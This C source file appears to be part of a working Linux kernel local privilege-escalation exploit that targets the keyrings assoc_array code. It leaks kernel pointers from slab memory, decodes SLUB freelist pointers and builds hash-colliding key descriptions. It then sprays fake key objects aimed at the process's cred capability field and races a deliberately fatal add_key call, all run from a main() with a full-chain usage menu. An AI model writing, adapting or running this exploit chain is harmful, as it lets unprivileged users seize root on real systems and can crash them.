/* Source construction, fatal trigger, chain orchestration and main().
   Included by exploit.c, after race.inc. */

#include "freeptr.inc"

extern int k2_runtime_support_dispatch(int argc, char **argv);
extern int k2_runtime_take_payload_capture(key_serial_t *ring,
                                           key_serial_t *serials,
                                           size_t capacity,
                                           size_t *count);

#define K2_KEPT_CARRIERS 56U
#define K2_SOURCE_PARENT_PERM UINT32_C(0x3f3f0000)

struct k2_source_trigger {
    key_serial_t ring;
    char final_description[K2_LONG_DESC_MAX];
    uint64_t class_hash;
    uint64_t outlier_hash;
};

struct k2_source_keeper {
    pid_t pid;
    int release_fd;
};

struct k2_source_message {
    int rc;
    struct k2_source_trigger source;
};

struct k2_fatal_context {
    key_serial_t ring;
    const char *description;
    int cpu;
};

static int k2_add_user_description(key_serial_t ring, const char *description,
                                   key_serial_t *serial_out)
{
    long serial = add_key_raw("user", description, "x", 1, ring);

    if (serial < 0)
        return -errno;
    if (serial_out)
        *serial_out = (key_serial_t)serial;
    return 0;
}

static int k2_prepare_source(const struct k2_target_choice *choice,
                             uint64_t type, uint64_t domain,
                             key_serial_t destination,
                             struct k2_source_trigger *source)
{
    char ring_description[64], outlier[32];
    key_serial_t serial = 0, outlier_serial = 0;
    long value;
    int rc;

    snprintf(ring_description, sizeof(ring_description),
             "k2-integrated-source-%ld", (long)getpid());
    value = add_key_raw("keyring", ring_description, NULL, 0, destination);
    if (value < 0)
        return -errno;
    source->ring = (key_serial_t)value;
    source->class_hash = choice->collision.hash;
    rc = k2_find_outlier(type, domain, choice->collision.hash, outlier,
                         &source->outlier_hash);
    if (rc)
        return rc;
    for (unsigned int i = 0; i < 16; i++) {
        rc = k2_add_user_description(source->ring,
                                     choice->collision.descriptions[i],
                                     &serial);
        if (rc)
            return rc;
    }
    rc = k2_add_user_description(source->ring, outlier, &outlier_serial);
    if (rc)
        return rc;
    value = keyctl_raw(KEYCTL_UNLINK, (unsigned long)outlier_serial,
                       (unsigned long)source->ring, 0, 0);
    if (value < 0)
        return -errno;
    memcpy(source->final_description, choice->collision.descriptions[16],
           choice->collision.length + 1);
    printf("INTEGRATED_SOURCE_READY ring=%d class_hash=%#018" PRIx64
           " outlier_hash=%#018" PRIx64 " desc_len=%zu\n", source->ring,
           source->class_hash, source->outlier_hash, choice->collision.length);
    return 0;
}

static int k2_fd_write_all(int fd, const void *buffer, size_t length)
{
    const unsigned char *p = buffer;

    while (length) {
        ssize_t done = write(fd, p, length);

        if (done < 0) {
            if (errno == EINTR)
                continue;
            return -errno;
        }
        if (done == 0)
            return -EIO;
        p += done;
        length -= (size_t)done;
    }
    return 0;
}

static int k2_fd_read_all(int fd, void *buffer, size_t length)
{
    unsigned char *p = buffer;

    while (length) {
        ssize_t done = read(fd, p, length);

        if (done < 0) {
            if (errno == EINTR)
                continue;
            return -errno;
        }
        if (done == 0)
            return -EPIPE;
        p += done;
        length -= (size_t)done;
    }
    return 0;
}

static void k2_release_isolated_source(struct k2_source_keeper *keeper)
{
    if (keeper->release_fd >= 0) {
        close(keeper->release_fd);
        keeper->release_fd = -1;
    }
    if (keeper->pid > 0) {
        while (waitpid(keeper->pid, NULL, 0) < 0 && errno == EINTR)
            ;
        keeper->pid = -1;
    }
}

static int k2_prepare_isolated_source(const struct k2_target_choice *choice,
                                      uint64_t type, uint64_t domain,
                                      struct k2_source_trigger *source,
                                      struct k2_source_keeper *keeper)
{
    struct k2_source_message message = {0};
    int result_pipe[2] = {-1, -1};
    int release_pipe[2] = {-1, -1};
    pid_t pid;
    int rc;

    if (pipe2(result_pipe, O_CLOEXEC) < 0 ||
        pipe2(release_pipe, O_CLOEXEC) < 0) {
        rc = -errno;
        goto error;
    }
    pid = fork();
    if (pid < 0) {
        rc = -errno;
        goto error;
    }
    if (pid == 0) {
        char session_name[64];
        char release_byte;
        long session;

        close(result_pipe[0]);
        close(release_pipe[1]);
        snprintf(session_name, sizeof(session_name),
                 "k2-source-session-%ld", (long)getpid());
        session = keyctl_raw(KEYCTL_JOIN_SESSION_KEYRING,
                             (unsigned long)session_name, 0, 0, 0);
        if (session < 0)
            message.rc = -errno;
        else {
            message.rc = k2_prepare_source(choice, type, domain,
                                           KEY_SPEC_SESSION_KEYRING,
                                           &message.source);
            /* The parent deliberately does not possess the child's private
             * session ring.  Grant the same UID explicit Search and Write so
             * direct serial lookup, search and the fatal add stay authorized
             * without linking the corrupt ring into the parent's graph. */
            if (message.rc == 0 &&
                keyctl_raw(KEYCTL_SETPERM,
                           (unsigned long)message.source.ring,
                           K2_SOURCE_PARENT_PERM, 0, 0) < 0)
                message.rc = -errno;
        }
        fflush(stdout);
        (void)k2_fd_write_all(result_pipe[1], &message, sizeof(message));
        close(result_pipe[1]);
        if (message.rc == 0) {
            while (read(release_pipe[0], &release_byte, 1) < 0 &&
                   errno == EINTR)
                ;
        }
        close(release_pipe[0]);
        _exit(message.rc == 0 ? 0 : 1);
    }
    close(result_pipe[1]);
    result_pipe[1] = -1;
    close(release_pipe[0]);
    release_pipe[0] = -1;
    rc = k2_fd_read_all(result_pipe[0], &message, sizeof(message));
    close(result_pipe[0]);
    result_pipe[0] = -1;
    if (rc || message.rc) {
        close(release_pipe[1]);
        release_pipe[1] = -1;
        while (waitpid(pid, NULL, 0) < 0 && errno == EINTR)
            ;
        return rc ? rc : message.rc;
    }
    *source = message.source;
    keeper->pid = pid;
    keeper->release_fd = release_pipe[1];
    printf("INTEGRATED_SOURCE_ISOLATED keeper_pid=%ld ring=%d\n", (long)pid,
           source->ring);
    return 0;
error:
    for (int i = 0; i < 2; i++) {
        if (result_pipe[i] >= 0)
            close(result_pipe[i]);
        if (release_pipe[i] >= 0)
            close(release_pipe[i]);
    }
    return rc;
}

static int k2_issue_fatal_add(void *context)
{
    struct k2_fatal_context *fatal = context;
    long serial;
    int rc = pin_current_thread(fatal->cpu);

    if (rc)
        return rc;
    printf("INTEGRATED_FATAL_ADD cpu=%d source=%d; syscall should not return\n",
           fatal->cpu, fatal->ring);
    fflush(stdout);
    serial = add_key_raw("user", fatal->description, "x", 1, fatal->ring);
    if (serial < 0)
        return -errno;
    printf("UNEXPECTED_FATAL_ADD_RETURN serial=%ld\n", serial);
    return -EUCLEAN;
}

static int k2_choose_fake_leaf(uint64_t base, uint64_t *payload,
                               uint64_t *fake_leaf)
{
    for (unsigned int slot = 0; slot < H_USER_PAYLOAD_OBJECTS_PER_SLAB;
         slot++) {
        uint64_t candidate_payload =
            base + (uint64_t)slot * H_USER_PAYLOAD_BUCKET;
        uint64_t candidate_fake = candidate_payload + H_USER_PAYLOAD_HEADER;
        bool no_nul = true;

        for (unsigned int i = 0; i < 8; i++)
            if (((candidate_fake >> (i * 8)) & 0xffU) == 0)
                no_nul = false;
        if (!no_nul)
            continue;
        *payload = candidate_payload;
        *fake_leaf = candidate_fake;
        return 0;
    }
    return -ENOENT;
}

static int k2_env_uint(const char *name, unsigned int default_value,
                       unsigned int minimum, unsigned int maximum,
                       unsigned int *result)
{
    const char *text = getenv(name);
    char *end;
    unsigned long value;

    if (!text || !*text) {
        *result = default_value;
        return 0;
    }
    errno = 0;
    value = strtoul(text, &end, 0);
    if (errno || *end || value < minimum || value > maximum)
        return -EINVAL;
    *result = (unsigned int)value;
    return 0;
}

static int k2_support_call(int argc, char **argv, const char *stage)
{
    int result = k2_runtime_support_dispatch(argc, argv);

    printf("FULL_CHAIN_SUPPORT stage=%s dispatch_result=%d\n", stage, result);
    return result == 0 ? 0 : -ENODATA;
}

/*
 * The upstream chain assumes ~800 live keys, which stock Debian/Ubuntu deny.
 * Scale the rank census to both key quotas instead of dying on EDQUOT.
 */
static void k2_plan_key_budget(unsigned int *workers_out,
                               unsigned int *carriers_out)
{
    unsigned long maxkeys = read_sysctl_ulong("/proc/sys/kernel/keys/maxkeys",
                                              200);
    unsigned long maxbytes = read_sysctl_ulong("/proc/sys/kernel/keys/maxbytes",
                                               20000);
    unsigned long payload = H_USER_PAYLOAD_REQUEST;
    unsigned long by_bytes = maxbytes > payload * 3 ?
                             (maxbytes - payload * 3) / payload : 0;
    unsigned long budget = maxkeys < by_bytes ? maxkeys : by_bytes;
    unsigned int workers, carriers, prefix;

    if (budget > 4 * K2_PREP_KEY_RESERVE)
        budget -= K2_PREP_KEY_RESERVE;
    else if (budget > 40)
        budget = budget * 3 / 5;
    workers = budget > K2_PREP_WORKERS_MAX ? K2_PREP_WORKERS_MAX :
              (unsigned int)budget;
    if (workers < 32)
        workers = 32;
    carriers = workers / 4;
    if (carriers < 8)
        carriers = 8;
    if (carriers > K2_KEPT_CARRIERS)
        carriers = K2_KEPT_CARRIERS;
    prefix = workers * K2_PREP_PREFIX_MAX / K2_PREP_WORKERS_MAX;
    if (prefix < 8)
        prefix = 8;
    if (prefix + 8 > workers)
        prefix = workers - 8;
    k2_prep_workers = workers;
    k2_prep_prefix = prefix;
    k2_prep_critical = workers - prefix;
    k2_prep_gates = 1 + (k2_prep_critical + K2_PREP_GROUP_SIZE - 1) /
                        K2_PREP_GROUP_SIZE;
    if (k2_prep_gates > K2_PREP_GATES_MAX)
        k2_prep_gates = K2_PREP_GATES_MAX;
    *workers_out = workers;
    *carriers_out = carriers;
    printf("FULL_CHAIN_PROFILE maxkeys=%lu maxbytes=%lu workers=%u "
           "prefix=%u critical=%u gates=%u carriers=%u\n", maxkeys, maxbytes,
           workers, prefix, k2_prep_critical, k2_prep_gates, carriers);
}

static int gate_environment(int *search_cpu, int *trigger_cpu)
{
    struct utsname uts;
    long cpus = sysconf(_SC_NPROCESSORS_ONLN);
    long page = sysconf(_SC_PAGESIZE);
    unsigned long long cap = 0;
    long key;

    if (sizeof(void *) != 8) {
        fprintf(stderr, "GATE_FAIL arch: 64-bit required\n");
        return -ENOTSUP;
    }
    if (page != 4096) {
        fprintf(stderr, "GATE_FAIL page_size=%ld\n", page);
        return -ENOTSUP;
    }
    if (uname(&uts) != 0 || strcmp(uts.machine, "x86_64") != 0) {
        fprintf(stderr, "GATE_FAIL machine=%s\n",
                uname(&uts) == 0 ? uts.machine : "?");
        return -ENOTSUP;
    }
    if (getuid() == 0 || geteuid() == 0) {
        fprintf(stderr, "GATE_FAIL already root\n");
        return -EALREADY;
    }
    if (read_cap_eff_checked(&cap) != 0 || cap != 0) {
        fprintf(stderr, "GATE_FAIL CapEff=%016llx (need 0)\n", cap);
        return -EPERM;
    }
    key = syscall(SYS_add_key, "user", "k2-gate", "x", 1,
                  KEY_SPEC_PROCESS_KEYRING);
    if (key < 0) {
        fprintf(stderr, "GATE_FAIL add_key errno=%d\n", errno);
        return -errno;
    }
    (void)keyctl_raw(KEYCTL_INVALIDATE, (unsigned long)key, 0, 0, 0);
    {
        int probe = socket(AF_ALG, SOCK_SEQPACKET, 0);

        if (probe < 0) {
            fprintf(stderr, "GATE_FAIL AF_ALG errno=%d (unprivileged AF_ALG "
                    "disabled?)\n", errno);
            return -errno;
        }
        close(probe);
    }
    if (access("/proc/self/status", R_OK) != 0 ||
        access("/proc/key-users", R_OK) != 0) {
        fprintf(stderr, "GATE_FAIL /proc restricted\n");
        return -EACCES;
    }
    if (cpus < 2) {
        *search_cpu = 0;
        *trigger_cpu = 0;
        printf("GATE_NOTE single CPU, both phases on cpu0\n");
    } else {
        *search_cpu = 1;
        *trigger_cpu = 0;
    }
    printf("GATE_ENVIRONMENT ok cpus=%ld page=%ld uid=%ld machine=%s\n", cpus,
           page, (long)getuid(), uts.machine);
    return 0;
}

static int run_k2_vuln_trigger(void)
{
    struct k2_target_choice choice = {0};
    char ring_description[64], outlier[32];
    key_serial_t ring, outlier_serial = 0;
    uint64_t fake_leaf = UINT64_C(0xffff9e8d4011b318), outlier_hash;
    long value;
    int rc;

    rc = k2_build_target(k2l.key_type_user, k2l.default_domain_tag, fake_leaf,
                         k2l.fake_slot, &choice);
    if (rc)
        return rc;
    snprintf(ring_description, sizeof(ring_description), "k2-trigger-%ld",
             (long)getpid());
    value = add_key_raw("keyring", ring_description, NULL, 0,
                        KEY_SPEC_PROCESS_KEYRING);
    if (value < 0)
        return -errno;
    ring = (key_serial_t)value;
    for (unsigned int i = 0; i < 16; i++) {
        rc = k2_add_user_description(ring, choice.collision.descriptions[i],
                                     NULL);
        if (rc)
            return rc;
    }
    rc = k2_find_outlier(k2l.key_type_user, k2l.default_domain_tag,
                         choice.collision.hash, outlier, &outlier_hash);
    if (rc)
        return rc;
    rc = k2_add_user_description(ring, outlier, &outlier_serial);
    if (rc)
        return rc;
    if (keyctl_raw(KEYCTL_UNLINK, (unsigned long)outlier_serial,
                   (unsigned long)ring, 0, 0) < 0)
        return -errno;
    printf("VULN_TRIGGER_READY ring=%d fake_slot=%u class_hash=%#" PRIx64
           "\n", ring, k2l.fake_slot, choice.collision.hash);
    rc = k2_add_user_description(ring, choice.collision.descriptions[16],
                                 NULL);
    if (rc)
        return rc;
    printf("UNEXPECTED_VULN_TRIGGER_RETURN\n");
    return -EUCLEAN;
}

static int run_integrated_chain(const char *payload_page_path,
                                const char *filp_page_path, int search_cpu,
                                unsigned int timeout_ms, size_t spray_count)
{
    unsigned char payload_page[4096], filp_page[4096];
    unsigned char fake[H_DIRECT_FAKE_BYTES];
    uint64_t encoded[H_USER_PAYLOAD_OBJECTS_PER_SLAB];
    struct freelist_solution solution;
    struct k2_target_choice choice = {0};
    struct k2_source_trigger source = {0};
    struct k2_source_keeper source_keeper = {.pid = -1, .release_fd = -1};
    struct k2_prep_gate prep_gate = {0};
    struct k2_fatal_context fatal;
    struct fake_spec fake_spec;
    key_serial_t carrier_ring = -1;
    key_serial_t carriers[K2_KEPT_CARRIERS];
    size_t carrier_count = 0;
    uint64_t cred, fake_leaf, payload;
    unsigned int cred_hits;
    char fake_path[128], serial_path[128];
    int rc;

    rc = read_page_file(payload_page_path, payload_page);
    if (rc)
        return rc;
    extract_freelist_words(payload_page, encoded);
    rc = solve_freelist(encoded, &solution);
    if (rc)
        return rc;
    rc = k2_layout_finish(solution.base);
    if (rc)
        return rc;
    rc = k2_choose_fake_leaf(solution.base, &payload, &fake_leaf);
    if (rc)
        return rc;
    rc = read_page_file(filp_page_path, filp_page);
    if (rc)
        return rc;
    rc = scan_filp_cred(filp_page, &cred, &cred_hits);
    if (rc)
        return rc;
    rc = k2_build_target(k2l.key_type_user, k2l.default_domain_tag, fake_leaf,
                         k2l.fake_slot, &choice);
    if (rc) {
        fprintf(stderr, "INTEGRATED_TARGET_FAIL rc=%d\n", rc);
        return rc;
    }
    fake_spec = (struct fake_spec){
        .cred = (cred + k2l.cred_cap_effective) - k2l.ku_qnbytes,
        .type = k2l.key_type_user,
        .domain_tag = k2l.default_domain_tag,
        .description = fake_leaf + k2l.desc_off,
        .hash = choice.hash,
        .x = k2_index_x(choice.description, choice.length),
    };
    build_direct_fake(fake, &fake_spec, choice.description, choice.length,
                      fake_leaf);
    rc = validate_gadget_fake(fake);
    if (rc) {
        fprintf(stderr, "INTEGRATED_FAKE_FAIL rc=%d\n", rc);
        return rc;
    }
    rc = k2_runtime_take_payload_capture(&carrier_ring, carriers,
                                         ARRAY_SIZE(carriers),
                                         &carrier_count);
    if (rc)
        return rc;
    if (carrier_count < H_USER_PAYLOAD_OBJECTS_PER_SLAB)
        return -ENOSPC;
    rc = k2_prepare_isolated_source(&choice, k2l.key_type_user,
                                    k2l.default_domain_tag, &source,
                                    &source_keeper);
    if (rc)
        return rc;
    rc = k2_prep_gate_prepare(&prep_gate, carriers, carrier_count, fake,
                              search_cpu == 0 ? 1 : 0, search_cpu);
    if (rc) {
        k2_release_isolated_source(&source_keeper);
        return rc;
    }
    rc = pin_current_thread(search_cpu == 0 ? 1 : 0);
    if (rc) {
        k2_release_isolated_source(&source_keeper);
        return rc;
    }
    rc = k2_prep_gate_launch(&prep_gate);
    if (rc) {
        k2_release_isolated_source(&source_keeper);
        return rc;
    }
    printf("INTEGRATED_REBACK_SPRAY carriers=%zu serial_base=%#x\n",
           carrier_count, K2_PREP_SERIAL_BASE);
    snprintf(fake_path, sizeof(fake_path), "/tmp/k2-integrated-%ld.fake",
             (long)getpid());
    snprintf(serial_path, sizeof(serial_path), "/tmp/k2-integrated-%ld.serials",
             (long)getpid());
    rc = write_exact_file(fake_path, fake, sizeof(fake));
    if (!rc)
        rc = write_exact_file(serial_path, carriers,
                              carrier_count * sizeof(key_serial_t));
    if (rc)
        goto out;
    fatal = (struct k2_fatal_context){
        .ring = source.ring,
        .description = source.final_description,
        .cpu = search_cpu == 0 ? 1 : 0,
    };
    printf("INTEGRATED_READY payload=%#" PRIx64 " fake=%#" PRIx64
           " cred=%#" PRIx64 " cred_hits=%u class_hash=%#" PRIx64
           " target=%s len=%zu fake_slot=%u desc_off=%u search_cpu=%d "
           "trigger_cpu=%d\n", payload, fake_leaf, cred, cred_hits,
           choice.hash, choice.description, choice.length, k2l.fake_slot,
           k2l.desc_off, search_cpu, fatal.cpu);
    rc = run_race_once(source.ring, "user", choice.description, search_cpu,
                       timeout_ms, fake_path, serial_path, spray_count, true,
                       k2_issue_fatal_add, &fatal, &prep_gate);
out:
    k2_release_isolated_source(&source_keeper);
    unlink(fake_path);
    unlink(serial_path);
    return rc;
}

static int run_full_chain(int search_cpu, unsigned int timeout_ms,
                          size_t spray_count)
{
    struct k2_key_pointers pointers = {0};
    unsigned int control_attempts, payload_attempts, reserve_mib;
    unsigned int cred_control_attempts, cred_files, cred_attempts;
    unsigned int workers = 0, carriers = 0, trigger_cpu = 0;
    char prefix[96], control_path[128], cred_control_path[128];
    char payload_path[128], filp_path[128], scout_path[128];
    char control_text[16], payload_text[16], reserve_text[16];
    char cred_control_text[16], cred_files_text[16], cred_attempts_text[16];
    char *control_argv[5], *payload_argv[6], *cred_control_argv[5];
    char *cred_argv[7];
    unsigned char dummy_fake[H_DIRECT_FAKE_BYTES];
    unsigned long long initial_cap;
    long process_ring;
    int rc, proof_control;

    rc = arm_release_watchdog();
    if (rc)
        return rc;
    printf("[*] assoc_array shortcut-chain: K2 port. uid=%ld "
           "panic_on_oops=%d watchdog_s=%u btf=%d kallsyms_readable=%d\n",
           (long)getuid(), !panic_on_oops_disabled(),
           K2_RELEASE_WATCHDOG_SECONDS,
           access("/sys/kernel/btf/vmlinux", R_OK) == 0,
           access("/proc/kallsyms", R_OK) == 0);
    rc = gate_environment(&search_cpu, &trigger_cpu);
    if (rc)
        return rc;
    (void)trigger_cpu;
    rc = k2_layout_probe();
    if (rc)
        return rc;
    rc = k2_layout_finish(0);
    if (rc)
        return rc;
    rc = k2_layout_selftest();
    if (rc)
        return rc;
    if (k2_env_uint("K2_CONTROL_ATTEMPTS", 64, 1, 4096, &control_attempts) ||
        k2_env_uint("K2_PAYLOAD_ATTEMPTS", 512, 1, 8192, &payload_attempts) ||
        k2_env_uint("K2_RESERVE_MIB", 256, 32, 8192, &reserve_mib) ||
        k2_env_uint("K2_CRED_CONTROL_ATTEMPTS", 64, 1, 4096,
                    &cred_control_attempts) ||
        k2_env_uint("K2_CRED_FILES", 900, 16, 8192, &cred_files) ||
        k2_env_uint("K2_CRED_ATTEMPTS", 512, 1, 8192, &cred_attempts))
        return -EINVAL;

    /* Type/domain pointers first: symbol maps are free, the slab leak is the
     * universal fallback, and the order probe rejects either when wrong.
     * Nothing else in the chain can start without them. */
    rc = k2_symbol_key_pointers(&pointers);
    if (rc == 0 && k2_verify_key_pointers(&pointers) != 0)
        rc = -EAGAIN;
    if (rc) {
        memset(&pointers, 0, sizeof(pointers));
        printf("[*] symbol maps unusable (rc=%d), leaking a struct key slab\n",
               rc);
        rc = k2_leak_key_pointers(leak_capture, K2_LEAK_ATTEMPTS,
                                  K2_LEAK_DELAY_US, &pointers);
        if (rc)
            return rc;
        rc = k2_verify_key_pointers(&pointers);
        if (rc)
            return rc;
    }
    k2l.key_type_user = pointers.type;
    k2l.default_domain_tag = pointers.domain;
    snprintf(k2l.type_source, sizeof(k2l.type_source), "%s", pointers.source);
    printf("[+] key_type_user=%#" PRIx64 " default_domain_tag=%#" PRIx64
           " (source=%s)\n", k2l.key_type_user, k2l.default_domain_tag,
           k2l.type_source);
    k2l.slab_lo = 0;
    k2l.slab_hi = 0;

    snprintf(prefix, sizeof(prefix), "/tmp/k2-full-%ld", (long)getpid());
    snprintf(control_path, sizeof(control_path), "%s-control.bin", prefix);
    snprintf(cred_control_path, sizeof(cred_control_path), "%s-cred.bin",
             prefix);
    snprintf(payload_path, sizeof(payload_path), "%s-payload.bin", prefix);
    snprintf(filp_path, sizeof(filp_path), "%s-filp.bin", prefix);
    snprintf(scout_path, sizeof(scout_path), "%s-scout.bin", prefix);
    memset(dummy_fake, 0x11, sizeof(dummy_fake));
    rc = write_exact_file(scout_path, dummy_fake, sizeof(dummy_fake));
    if (rc)
        return rc;
    rc = k2_freeptr_probe(scout_path, payload_path);
    if (rc) {
        fprintf(stderr, "[-] freepointer probe failed rc=%d (unknown SLUB "
                "layout)\n", rc);
        goto out;
    }

    proof_control = try_proof_file();
    printf("[*] proof control rc=%d\n", proof_control);
    if (proof_control == 0) {
        rc = -EALREADY;
        goto out;
    }
    /* Installing the first process keyring performs prepare_creds() and
     * commit_creds(); do it before the cred oracle so the captured f_cred is
     * the pointer shared by every later search/refill thread. */
    process_ring = keyctl_raw(KEYCTL_GET_KEYRING_ID,
                              (unsigned long)KEY_SPEC_PROCESS_KEYRING, 1, 0, 0);
    if (process_ring < 0) {
        rc = -errno;
        goto out;
    }
    rc = read_cap_eff_checked(&initial_cap);
    if (rc || initial_cap != 0) {
        fprintf(stderr, "[-] CapEff=%016llx after keyring setup\n",
                initial_cap);
        rc = -EPERM;
        goto out;
    }
    k2_plan_key_budget(&workers, &carriers);
    snprintf(control_text, sizeof(control_text), "%u", control_attempts);
    snprintf(payload_text, sizeof(payload_text), "%u", payload_attempts);
    snprintf(reserve_text, sizeof(reserve_text), "%u", reserve_mib);
    snprintf(cred_control_text, sizeof(cred_control_text), "%u",
             cred_control_attempts);
    snprintf(cred_files_text, sizeof(cred_files_text), "%u", cred_files);
    snprintf(cred_attempts_text, sizeof(cred_attempts_text), "%u",
             cred_attempts);

    control_argv[0] = "k2_runtime_support";
    control_argv[1] = "--public-user-control";
    control_argv[2] = control_path;
    control_argv[3] = control_text;
    control_argv[4] = NULL;
    puts("[*] gate0: public user-copy geometry control");
    if (control_attempts)
        (void)k2_support_call(4, control_argv, "public_control");

    payload_argv[0] = "k2_runtime_support";
    payload_argv[1] = "--capture-payload-pressure-keep";
    payload_argv[2] = payload_path;
    payload_argv[3] = payload_text;
    payload_argv[4] = reserve_text;
    payload_argv[5] = NULL;
    puts("[*] gate1: quarantined payload slab capture");
    rc = k2_support_call(5, payload_argv, "payload_capture");
    if (rc)
        goto out;

    cred_control_argv[0] = "k2_runtime_support";
    cred_control_argv[1] = "--public-user-cred-control";
    cred_control_argv[2] = cred_control_path;
    cred_control_argv[3] = cred_control_text;
    cred_control_argv[4] = NULL;
    puts("[*] gate2: filp geometry control");
    (void)k2_support_call(4, cred_control_argv, "cred_control");

    cred_argv[0] = "k2_runtime_support";
    cred_argv[1] = "--capture-cred-pressure";
    cred_argv[2] = filp_path;
    cred_argv[3] = cred_files_text;
    cred_argv[4] = cred_attempts_text;
    cred_argv[5] = reserve_text;
    cred_argv[6] = NULL;
    puts("[*] gate3: filp credential capture");
    rc = k2_support_call(6, cred_argv, "cred_capture");
    if (rc)
        goto out;

    puts("[*] decode, reback, build collision, race, trigger");
    rc = run_integrated_chain(payload_path, filp_path, search_cpu, timeout_ms,
                              carriers ? carriers : 1);
    (void)workers;
out:
    unlink(control_path);
    unlink(cred_control_path);
    unlink(payload_path);
    unlink(filp_path);
    unlink(scout_path);
    return rc;
}

static int run_leak_only(void)
{
    struct k2_key_pointers pointers = {0};
    int search_cpu = 1, trigger_cpu = 0;
    int rc;

    rc = gate_environment(&search_cpu, &trigger_cpu);
    if (rc)
        return rc;
    rc = k2_layout_probe();
    if (rc)
        return rc;
    rc = k2_layout_finish(0);
    if (rc)
        return rc;
    rc = k2_symbol_key_pointers(&pointers);
    if (rc == 0) {
        printf("LEAK_KEY_POINTERS source=%s type=%#" PRIx64 " domain=%#" PRIx64
               "\n", pointers.source, pointers.type, pointers.domain);
        rc = k2_verify_key_pointers(&pointers);
        if (rc == 0)
            return 0;
    }
    memset(&pointers, 0, sizeof(pointers));
    rc = k2_leak_key_pointers(leak_capture, K2_LEAK_ATTEMPTS,
                              K2_LEAK_DELAY_US, &pointers);
    if (rc)
        return rc;
    printf("LEAK_KEY_POINTERS source=%s type=%#" PRIx64 " domain=%#" PRIx64
           " votes=%u\n", pointers.source, pointers.type, pointers.domain,
           pointers.votes);
    return k2_verify_key_pointers(&pointers);
}

static int run_layout_only(void)
{
    int rc = k2_layout_probe();

    if (rc)
        return rc;
    rc = k2_layout_finish(UINT64_C(0xffff9e8d4011b000));
    if (rc)
        return rc;
    k2_layout_report();
    return k2_layout_selftest();
}

static int resolve_pointers_or_die(void)
{
    struct k2_key_pointers pointers = {0};
    int rc = k2_symbol_key_pointers(&pointers);

    if (rc == 0 && k2_verify_key_pointers(&pointers) == 0) {
        k2l.key_type_user = pointers.type;
        k2l.default_domain_tag = pointers.domain;
        return 0;
    }
    memset(&pointers, 0, sizeof(pointers));
    rc = k2_leak_key_pointers(leak_capture, K2_LEAK_ATTEMPTS,
                              K2_LEAK_DELAY_US, &pointers);
    if (rc)
        return rc;
    rc = k2_verify_key_pointers(&pointers);
    if (rc)
        return rc;
    k2l.key_type_user = pointers.type;
    k2l.default_domain_tag = pointers.domain;
    return 0;
}

static void usage(FILE *f)
{
    fprintf(f,
        "usage:\n"
        "  exploit                       full chain\n"
        "  exploit --full-chain CPU TIMEOUT_MS SPRAY\n"
        "  exploit --layout              print the probed layout only\n"
        "  exploit --leak-only           leak and verify key_type_user\n"
        "  exploit --vuln-trigger        deterministic BUG (needs pointers)\n"
        "  exploit --selftest            offline self test\n"
        "  exploit --post-check          print CapEff and try the proof files\n"
        "\nEnv: K2_CONTROL_ATTEMPTS K2_PAYLOAD_ATTEMPTS K2_RESERVE_MIB\n"
        "     K2_CRED_FILES K2_CRED_ATTEMPTS K2_OFF_* (BTF-less fallback)\n");
}

static int parse_long_arg(const char *text, long *value)
{
    char *end;
    long v;

    errno = 0;
    v = strtol(text, &end, 0);
    if (errno || !*text || *end)
        return -EINVAL;
    *value = v;
    return 0;
}

static int parse_u64_arg(const char *text, uint64_t *value)
{
    char *end;
    unsigned long long v;

    errno = 0;
    v = strtoull(text, &end, 0);
    if (errno || !*text || *end)
        return -EINVAL;
    *value = (uint64_t)v;
    return 0;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    if (argc == 1)
        return report_rc("full-chain", run_full_chain(1, 5000, 8));
    if (argc == 2 && strcmp(argv[1], "--selftest") == 0)
        return selftest();
    if (argc == 2 && strcmp(argv[1], "--layout") == 0)
        return report_rc("layout", run_layout_only());
    if (argc == 2 && strcmp(argv[1], "--leak-only") == 0)
        return report_rc("leak-only", run_leak_only());
    if (argc == 2 && strcmp(argv[1], "--vuln-trigger") == 0) {
        int rc = k2_layout_probe();

        if (!rc)
            rc = k2_layout_finish(0);
        if (!rc)
            rc = resolve_pointers_or_die();
        if (!rc)
            rc = run_k2_vuln_trigger();
        return report_rc("vuln-trigger", rc);
    }
    if (argc == 5 && strcmp(argv[1], "--full-chain") == 0) {
        long cpu;
        uint64_t timeout, sprays;

        if (parse_long_arg(argv[2], &cpu) || cpu < 0 ||
            parse_u64_arg(argv[3], &timeout) || !timeout ||
            timeout > UINT32_MAX || parse_u64_arg(argv[4], &sprays) ||
            !sprays || sprays > SIZE_MAX)
            return report_rc("full-chain-args", -EINVAL);
        return report_rc("full-chain",
                         run_full_chain((int)cpu, (unsigned int)timeout,
                                        (size_t)sprays));
    }
    if (argc == 2 && strcmp(argv[1], "--post-check") == 0) {
        unsigned long long cap = read_cap_eff();

        printf("POST_CHECK CapEff=%016llx\n", cap);
        return try_proof_file() == 0 ? 0 : 1;
    }
    usage(stderr);
    return 2;
}
